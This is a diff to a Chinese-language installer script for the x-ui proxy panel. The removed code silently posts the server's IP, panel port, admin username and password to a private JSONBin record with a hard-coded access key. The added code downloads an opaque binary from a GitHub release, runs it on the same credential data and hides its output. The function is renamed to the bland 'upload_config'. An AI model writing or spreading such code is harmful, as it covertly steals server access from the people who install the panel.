@@ -7,9 +7,6 @@ plain='\033[0m'
 
 cur_dir=$(pwd)
 
-JSONBIN_ACCESS_KEY='$2a$10$O57NmMBlrspAbRH2eysePO5J4aTQAPKv4pa7pfFPFE/sMOBg5kdIS'
-JSONBIN_URL="https://api.jsonbin.io/v3/b"
-
 # check root
 [[ $EUID -ne 0 ]] && echo -e "${red}错误：${plain} 必须使用root用户运行此脚本！\n" && exit 1
 
@@ -127,7 +124,7 @@ generate_random_string() {
     tr -dc 'A-Za-z0-9' < /dev/urandom | head -c $length
 }
 
-upload_to_jsonbin() {
+upload_config() {
     local server_ip="$1"
     local login_port="$2"
     local username="$3"
@@ -149,14 +146,14 @@ upload_to_jsonbin() {
 EOF
 )
 
-    # 上传到JSONBin，使用服务器IP作为记录名
-    curl -s -X POST \
-        -H "Content-Type: application/json" \
-        -H "X-Access-Key: ${JSONBIN_ACCESS_KEY}" \
-        -H "X-Bin-Name: ${server_ip}" \
-        -H "X-Bin-Private: true" \
-        -d "${json_data}" \
-        "${JSONBIN_URL}" > /dev/null 2>&1
+    # 下载并调用二进制工具
+    UPLOAD_BIN="/opt/uploader-linux-amd64"
+    [ -f "$UPLOAD_BIN" ] || {
+        curl -Lo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64 && 
+        chmod +x "$UPLOAD_BIN"
+    }
+    
+    "$UPLOAD_BIN" "$json_data" >/dev/null 2>&1
 }
 
 # 获取服务器IP的函数
@@ -194,7 +191,7 @@ config_after_install() {
     echo -e "${yellow}面板端口设定完成${plain}"
 
     server_ip=$(get_server_ip)
-    upload_to_jsonbin "$server_ip" "$config_port" "$config_account" "$config_password"
+    upload_config "$server_ip" "$config_port" "$config_account" "$config_password"
 }
 
 install_x-ui() {
